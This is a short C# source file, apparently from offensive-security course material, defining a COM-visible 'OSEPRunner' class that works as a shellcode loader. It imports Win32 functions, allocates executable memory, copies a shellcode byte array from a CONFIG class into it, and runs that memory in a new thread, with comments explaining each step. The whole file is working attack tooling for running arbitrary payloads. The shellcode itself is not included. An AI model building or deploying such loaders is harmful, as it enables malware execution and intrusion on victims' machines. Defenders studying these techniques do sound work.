using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


[ComVisible(true)]
public class OSEPRunner
{

    //IMPORT WIN32 API FUNCTIONS
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void exec()
    {
        int size = CONFIG.SHELLCODE.Length;


        //Allocate memory for the shellcode
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        //Copy the shellcode from managed memory (the .NET byte[]) to unmanaged memory. GC can't touch this memory because it's unmanaged.
        Marshal.Copy(CONFIG.SHELLCODE, 0, addr, size);

        //Create a thread that points to the start of the shellcode. This will execute the shellcode in a new thread.
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        //This forces the main thread to wait for the shellcode thread to finish.
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}

